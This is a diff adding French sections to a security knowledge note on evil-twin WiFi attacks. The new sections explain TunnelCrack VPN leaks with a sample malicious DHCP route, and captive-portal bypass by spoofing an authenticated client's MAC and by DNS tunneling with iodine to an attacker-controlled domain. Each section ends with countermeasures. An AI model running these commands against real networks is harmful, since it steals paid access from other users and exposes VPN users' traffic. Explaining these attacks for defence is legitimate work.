@@ -2,7 +2,7 @@
 title: "Evil Twin et Phishing WiFi"
 domain: "Applied Sciences"
 subdomain: "Computer Science > Security > Networking > Network Security > WiFi"
-tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, evil-twin, fluxion, wifiphisher, mitm]
+tags: [sciences-appliquées, informatique, sécurité, réseau, wifi, evil-twin, fluxion, wifiphisher, mitm, tunnelcrack, captive-portal]
 date: "2026-05-17"
 ---
 
@@ -218,6 +218,48 @@ cd evilginx2 && make
 ```
 
 À combiner avec un captive portal qui redirige vers cette URL.
+
+## TunnelCrack — faire fuir le trafic hors du VPN
+
+**Le problème que ça exploite** : beaucoup de clients VPN ne chiffrent pas *tout* le trafic — ils suivent les routes réseau annoncées par le Wi-Fi auquel on est connecté (via DHCP) pour décider quoi envoyer "dans" le tunnel VPN et quoi envoyer "à côté" (split-tunneling), typiquement pour laisser passer l'accès à l'imprimante locale ou au routeur.
+
+**L'attaque** (Vanhoef et al., 2023) : un faux AP Wi-Fi public pousse, via DHCP, une route qui fait passer une IP publique choisie par l'attaquant pour une IP "locale" — le client VPN, pensant bien faire, envoie alors ce trafic **en clair, hors du tunnel**, sans jamais afficher d'erreur ou de déconnexion. Deux variantes :
+
+- **LocalNet leak** : la fausse route locale absorbe le trafic vers une IP publique précise choisie par l'attaquant
+- **ServerIP leak** : l'AP se fait passer pour le serveur VPN lui-même, dans un réseau qu'il contrôle
+
+```bash
+# Exemple de route DHCP malveillante (dnsmasq côté AP rogue)
+# dhcp-option=121,203.0.113.0/24,10.0.0.1
+# → fait croire au client que 203.0.113.0/24 est "local", donc hors VPN
+```
+
+**Ce que ça donne** : du trafic que la victime croit protégé (banque, mails...) part en clair sur le Wi-Fi public, observable par l'attaquant.
+
+**Comment s'en protéger côté client** : configurer le VPN en tunnel complet (désactiver le split-tunneling), ou utiliser un mode "always-on VPN" qui bloque tout trafic ne passant pas par le tunnel.
+
+## Contournement de portail captif
+
+Deux techniques simples, très utilisées en pratique sur les hotspots publics ou payants (hôtels, aéroports, cafés).
+
+**1. Emprunter l'accès d'un client déjà connecté (spoofing MAC)** — beaucoup de portails captifs autorisent l'accès par liste blanche d'adresses MAC, une fois qu'un appareil a payé ou saisi un code. Il suffit de repérer un client déjà actif et connecté, puis de prendre sa MAC pour hériter automatiquement de son accès — sans jamais passer par le portail soi-même.
+
+```bash
+airodump-ng wlan0mon                       # repérer un client déjà associé et actif
+macchanger -m <MAC_du_client_authentifié> wlan0
+```
+
+**2. Faire passer son trafic dans les requêtes DNS (tunneling DNS)** — avant de s'authentifier, un portail captif laisse quasiment toujours passer les requêtes DNS (port 53), pour permettre de résoudre l'adresse de sa propre page de connexion. En encodant du trafic arbitraire à l'intérieur de requêtes DNS envoyées à un serveur qu'on contrôle, on obtient un accès internet complet — sans jamais s'authentifier sur le portail.
+
+```bash
+# Côté serveur (attaquant, sur internet) : iodine ou dnscat2
+iodined -f -c 10.0.0.1 tunnel.attaquant.tld
+
+# Côté client, sur le Wi-Fi captif, avant toute authentification
+iodine -f 10.0.0.1 tunnel.attaquant.tld
+```
+
+**Comment s'en protéger côté opérateur du portail** : vérifier l'état de la session (pas juste la MAC en liste blanche statique), et surveiller/limiter les requêtes DNS avant authentification (un volume anormal de requêtes TXT/NULL est le signe classique d'un tunnel).
 
 ## Détection / contre-mesures
 
